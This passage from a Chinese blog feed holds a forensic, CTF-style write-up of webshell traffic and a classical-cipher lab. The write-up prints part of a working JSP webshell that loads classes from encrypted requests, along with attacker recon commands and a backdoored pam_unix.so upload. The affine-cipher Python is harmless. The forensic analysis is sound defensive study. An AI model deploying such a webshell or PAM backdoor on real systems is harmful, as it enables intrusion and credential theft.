base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">        value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            <span class="type">byte</span>[].class</span><br><span class="line">        &#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">            bs</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">            value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                <span class="type">byte</span>[].class</span><br><span class="line">            &#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                bs</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class base64;</span><br><span class="line">        <span class="type">byte</span>[] value = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">            value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class</span><br><span class="line">            &#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                bs</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">                value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                    String.class</span><br><span class="line">                &#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                    bs</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; %&gt; &lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = base64Decode(request.getParameter(pass));</span><br><span class="line">        data = x(data, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;payload&quot;</span>, <span class="keyword">new</span> <span class="title class_">X</span>(<span class="built_in">this</span>.getClass().getClassLoader()).Q(data));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;parameters&quot;</span>, data);</span><br><span class="line">            java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> ((Class) session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();</span><br><span class="line">            f.equals(arrOut);</span><br><span class="line">            f.equals(pageContext);</span><br><span class="line">            response.getWriter().write(md5.substring(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">            f.toString();</span><br><span class="line">            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="literal">true</span>)));</span><br><span class="line">            response.getWriter().write(md5.substring(<span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125; %&gt;</span><br></pre></td></tr></table></figure><p><code>flag&#123;7f0e6f&#125;</code></p><h2 id="密钥为"><a href="#密钥为" class="headerlink" title="密钥为?"></a>密钥为?</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250424-171244037.png" class="">  <p>AES加密key为xc<br><code>flag&#123;1710acba6220f62b&#125;</code></p><h2 id="webshell连接后的第一条命令为"><a href="#webshell连接后的第一条命令为" class="headerlink" title="webshell连接后的第一条命令为?"></a>webshell连接后的第一条命令为?</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-080322530.png" class="">  <img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-080425602.png" class="">  <p>我们可以看到其发了两个包才收到有数据的响应报文。我们看其传的马可以知道其请求包的加密方式为<br>base64-&gt;AES(ECB)默认为ECB。<br>AES的key为代码中的key<br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-080222588.png" class=""><br>可以发现请求的包解密为class文件。</p><p>第二个包为一个gz文件<br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-080759370.png" class=""><br>解压一下<br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-080825015.png" class=""><br>其指定了方法名<br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-081049666.png" class=""><br>test就是返回return</p><p>而响应需要除前16位和后16位再解密<br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-081207525.png" class="">  </p><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-081825100.png" class="">  <img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-081944663.png" class="">  <p>uname -r</p><h2 id="webshell的权限为"><a href="#webshell的权限为" class="headerlink" title="webshell的权限为?"></a>webshell的权限为?</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-082219696.png" class="">  <p>第一次连接webshell时会自带运行getBasicsInfo方法来获取一些信息<br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-082157887.png" class="">  </p><h2 id="黑客利用webshell执行命令查询服务器Linux系统发行版本是什么"><a href="#黑客利用webshell执行命令查询服务器Linux系统发行版本是什么" class="headerlink" title="黑客利用webshell执行命令查询服务器Linux系统发行版本是什么?"></a>黑客利用webshell执行命令查询服务器Linux系统发行版本是什么?</h2><p>一般方法是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">cat /etc/os-release</span><br><span class="line">lsb_release -a</span><br><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure><br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-091542574.png" class=""><br>第48个流发现cat /etc/os-release<br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-091608434.png" class=""><br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-091631762.png" class=""><br>Debian GNU/Linux 10 (buster)</p><h2 id="黑客利用webshell执行命令还查询并过滤了什么"><a href="#黑客利用webshell执行命令还查询并过滤了什么" class="headerlink" title="黑客利用webshell执行命令还查询并过滤了什么?"></a>黑客利用webshell执行命令还查询并过滤了什么?</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-082955934.png" class="">  <img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-091056778.png" class="">  <img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-091120050.png" class="">  <img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-091146128.png" class="">  <p>dpkg -l libpam-modules:amd64</p><h2 id="黑客留下后门的反连的IP和PORT是什么"><a href="#黑客留下后门的反连的IP和PORT是什么" class="headerlink" title="黑客留下后门的反连的IP和PORT是什么?"></a>黑客留下后门的反连的IP和PORT是什么?</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-090321674.png" class="">  <h2 id="什么文件"><a href="#什么文件" class="headerlink" title="什么文件"></a>什么文件</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-083205943.png" class="">  <p>看到了一个非常大的包猜测其为文件上传的流量包<br><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-083151341.png" class=""><br>解密后发现其上传的为ELF文件<br>pam_unix.so</p><h2 id="DNS服务器为"><a href="#DNS服务器为" class="headerlink" title="DNS服务器为?"></a>DNS服务器为?</h2><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-084922158.png" class="">  <img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-084934407.png" class="">  <h1 id="waf流量"><a href="#waf流量" class="headerlink" title="waf流量"></a>waf流量</h1><img src="/2025/04/24/%E7%8E%84%E6%9C%BA/IMG_20250425-093056774.png" class="">  ]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;蚁剑流量&quot;&gt;&lt;a href=&quot;#蚁剑流量&quot; class=&quot;headerlink&quot; title=&quot;蚁剑流量&quot;&gt;&lt;/a&gt;蚁剑流量&lt;/h1&gt;&lt;h2 id=&quot;1-木马的连接密码是多少&quot;&gt;&lt;a href=&quot;#1-木马的连接密码是多少&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://lisien11.xyz/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>密码实验</title>
    <link href="https://lisien11.xyz/2025/04/21/%E5%AF%86%E7%A0%81%E5%AE%9E%E9%AA%8C/"/>
    <id>https://lisien11.xyz/2025/04/21/%E5%AF%86%E7%A0%81%E5%AE%9E%E9%AA%8C/</id>
    <published>2025-04-21T11:25:07.000Z</published>
    <updated>2025-04-21T13:50:39.557Z</updated>
    
    <content type="html"><![CDATA[<h1 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text_to_numbers</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">for</span> char <span class="keyword">in</span> text.lower() <span class="keyword">if</span> char.isalpha()]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encryption</span>(<span class="params">m, a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> gcd(a, <span class="number">26</span>) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;密钥a必须与26互质！&quot;</span></span><br><span class="line">    numbers = text_to_numbers(m)</span><br><span class="line">    encrypted_number = [(a * num + b) % <span class="number">26</span> <span class="keyword">for</span> num <span class="keyword">in</span> numbers]</span><br><span class="line">    encrypted_text = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(num + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) <span class="keyword">for</span> num <span class="keyword">in</span> encrypted_number)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的密文是：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(encrypted_text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">c, a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> gcd(a, <span class="number">26</span>) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;密钥a必须与26互质！&quot;</span></span><br><span class="line">    encode_c = text_to_numbers(c)</span><br><span class="line">    a_1 = <span class="built_in">pow</span>(a, -<span class="number">1</span>, <span class="number">26</span>)</span><br><span class="line">    decryption_number = [(a_1 * (num - b)) % <span class="number">26</span> <span class="keyword">for</span> num <span class="keyword">in</span> encode_c]</span><br><span class="line">    decryption_text = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(num + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) <span class="keyword">for</span> num <span class="keyword">in</span> decryption_number)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的明文是：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(decryption_text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_valid_key_a</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入密钥a（必须与26互质）：&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> gcd(a, <span class="number">26</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;密钥a必须与26互质，请重新输入！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;******仿射密码******&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请选择操作：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1：加密&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2：解密&quot;</span>)</span><br><span class="line"></span><br><span class="line">    choose = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入选项（1或2）：&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> choose == <span class="number">1</span>:</span><br><span class="line">        m = <span class="built_in">input</span>(<span class="string">&quot;请输入明文：&quot;</span>)</span><br><span class="line">        a = get_valid_key_a()</span><br><span class="line">        b = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入密钥b：&quot;</span>))</span><br><span class="line">        encryption(m, a, b)</span><br><span class="line">    <span class="keyword">elif</span> choose == <span class="number">2</span>:</span><br><span class="line">        c = <span class="built_in">input</span>(<span class="string">&quot;请输入密文：&quot;</span>)</span><br><span class="line">        a = get_valid_key_a()</span><br><span class="line">        b = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入密钥b：&quot;</span>))</span><br><span class="line">        decryption(c, a, b)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无效选项，请重新运行程序并输入1或2。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>好的，我们来详细讲解一下 <strong>仿射密码</strong> 及你贴出来的这段 Python 代码，帮你理解它的原理和实现。</p><hr><h2 id="🔐-一、什么是仿射密码（Affine-Cipher）？"><a href="#🔐-一、什么是仿射密码（Affine-Cipher）？" class="headerlink" title="🔐 一、什么是仿射密码（Affine Cipher）？"></a>🔐 一、什么是仿射密码（Affine Cipher）？</h2><p>仿射密码是一种<strong>古典加密算法</strong>，属于单字母替换密码的范畴。它结合了两个数学变换：</p><ul><li>线性变换（乘法+加法）</li><li>模运算（取余）</li></ul><h3 id="加密公式："><a href="#加密公式：" class="headerlink" title="加密公式："></a>加密公式：</h3><p>对每个明文字母用以下公式变换：</p><p>[<br>E(x) = (a \cdot x + b) \mod 26<br>]</p><ul><li>( x )：明文字母在字母表中的位置（0~25）</li><li>( a, b )：密钥参数</li><li>( \mod 26 )：因为英文字母有26个，所以对26取余</li></ul><h3 id="解密公式："><a href="#解密公式：" class="headerlink" title="解密公式："></a>解密公式：</h3><p>[<br>D(y) = a^{-1} \cdot (y - b) \mod 26<br>]</p><ul><li>( y )：密文字母在字母表中的位置</li><li>( a^{-1} )：模 26 下的 ( a ) 的乘法逆元（即满足 ( a \cdot a^{-1} \equiv 1 \mod 26 ) 的整数）</li></ul><blockquote><p><strong>注意：</strong>只有当 ( \gcd(a, 26) = 1 ) 时，乘法逆元 ( a^{-1} ) 才存在，所以 <strong>a 必须与 26 互质</strong>。</p></blockquote><hr><h2 id="🧠-二、代码逐步解释"><a href="#🧠-二、代码逐步解释" class="headerlink" title="🧠 二、代码逐步解释"></a>🧠 二、代码逐步解释</h2><h3 id="1-text-to-numbers-text"><a href="#1-text-to-numbers-text" class="headerlink" title="1. text_to_numbers(text)"></a>1. <code>text_to_numbers(text)</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">text_to_numbers</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">for</span> char <span class="keyword">in</span> text.lower() <span class="keyword">if</span> char.isalpha()]</span><br></pre></td></tr></table></figure><p><strong>功能：</strong> 把文本转换为字母在字母表中的数字（a=0, b=1, …, z=25）</p><p>例子：<code>text_to_numbers(&quot;abc&quot;)</code> 输出 <code>[0, 1, 2]</code></p><hr><h3 id="2-encryption-m-a-b"><a href="#2-encryption-m-a-b" class="headerlink" title="2. encryption(m, a, b)"></a>2. <code>encryption(m, a, b)</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encryption</span>(<span class="params">m, a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> gcd(a, <span class="number">26</span>) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;密钥a必须与26互质！&quot;</span></span><br><span class="line">    numbers = text_to_numbers(m)</span><br><span class="line">    encrypted_number = [(a * num + b) % <span class="number">26</span> <span class="keyword">for</span> num <span class="keyword">in</span> numbers]</span><br><span class="line">    encrypted_text = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(num + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) <span class="keyword">for</span> num <span class="keyword">in</span> encrypted_number)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的密文是：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(encrypted_text))</span><br></pre></td></tr></table></figure><p><strong>功能：</strong>使用仿射加密公式加密明文</p><ul><li>先把明文变成数字列表</li><li>然后用 <code>(a*x + b) % 26</code> 加密</li><li>最后把加密后的数字变回字母，拼接输出</li></ul><hr><h3 id="3-decryption-c-a-b"><a href="#3-decryption-c-a-b" class="headerlink" title="3. decryption(c, a, b)"></a>3. <code>decryption(c, a, b)</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">c, a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> gcd(a, <span class="number">26</span>) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;密钥a必须与26互质！&quot;</span></span><br><span class="line">    encode_c = text_to_numbers(c)</span><br><span class="line">    a_1 = <span class="built_in">pow</span>(a, -<span class="number">1</span>, <span class="number">26</span>)  <span class="comment"># 求 a 的模逆</span></span><br><span class="line">    decryption_number = [(a_1 * (num - b)) % <span class="number">26</span> <span class="keyword">for</span> num <span class="keyword">in</span> encode_c]</span><br><span class="line">    decryption_text = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(num + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) <span class="keyword">for</span> num <span class="keyword">in</span> decryption_number)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的明文是：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(decryption_text))</span><br></pre></td></tr></table></figure><p><strong>功能：</strong>仿射解密</p><ul><li>先求出 ( a^{-1} )</li><li>然后用解密公式解密 <code>(a_inv * (y - b)) % 26</code></li><li>最后还原成明文输出</li></ul><hr><h3 id="4-get-valid-key-a"><a href="#4-get-valid-key-a" class="headerlink" title="4. get_valid_key_a()"></a>4. <code>get_valid_key_a()</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_valid_key_a</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入密钥a（必须与26互质）：&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> gcd(a, <span class="number">26</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;密钥a必须与26互质，请重新输入！&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>功能：</strong>确保用户输入的 <code>a</code> 合法，即与 26 互质。</p><hr><h3 id="5-main"><a href="#5-main" class="headerlink" title="5. main()"></a>5. <code>main()</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;******仿射密码******&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请选择操作：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1：加密&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2：解密&quot;</span>)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><strong>功能：</strong>主程序入口</p><ul><li>用户选择加密或解密</li><li>然后输入明文或密文及密钥</li><li>调用加密或解密函数</li></ul><hr><h2 id="🧪-三、实验操作步骤总结"><a href="#🧪-三、实验操作步骤总结" class="headerlink" title="🧪 三、实验操作步骤总结"></a>🧪 三、实验操作步骤总结</h2><ol><li>打开 Python 开发环境（如 IDLE、PyCharm 或终端）</li><li>粘贴并运行上述代码</li><li>根据提示输入：<ul><li>明文或密文</li><li>合法的 <code>a</code>（与26互质，比如 1, 3, 5, 7, 11…）</li><li>任意整数 <code>b</code></li></ul></li><li>查看输出的加密或解密结果</li></ol><hr><h2 id="✅-四、实验结果示例"><a href="#✅-四、实验结果示例" class="headerlink" title="✅ 四、实验结果示例"></a>✅ 四、实验结果示例</h2><h3 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请选择操作：1</span><br><span class="line">请输入明文：hello</span><br><span class="line">请输入密钥a：5</span><br><span class="line">请输入密钥b：8</span><br></pre></td></tr></table></figure><h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加密后的密文是：rclla</span><br></pre></td></tr></table></figure><p>然后用相同的 a 和 b 解密：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请选择操作：2</span><br><span class="line">请输入密文：rclla</span><br><span class="line">请输入密钥a：5</span><br><span class="line">请输入密钥b：8</span><br></pre></td></tr></table></figure></p><p>输出：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解密后的明文是：hello</span><br></pre></td></tr></table></figure></p><hr><h2 id="💡-五、实验心得"><a href="#💡-五、实验心得" class="headerlink" title="💡 五、实验心得"></a>💡 五、实验心得</h2><ul><li>仿射密码是理解更复杂密码算法的基础。</li><li>通过手动编码加密/解密过程，可以加深对模运算和逆元的理解。</li><li>加密算法不仅要保证加密效果，还必须保证可以还原，即“可逆性”。</li><li>Python 的 <code>pow(a, -1, m)</code> 很方便地找到了乘法逆元，不需要手写扩展欧几里得算法。</li></ul><hr><p>如果你还想要：</p><ul><li>图解加密过程</li><li>可视化步骤</li><li>支持大写字母或空格</li></ul><p>我也可以帮你扩展这个程序！要不要来个 GUI 版本的？😄</p><h1 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 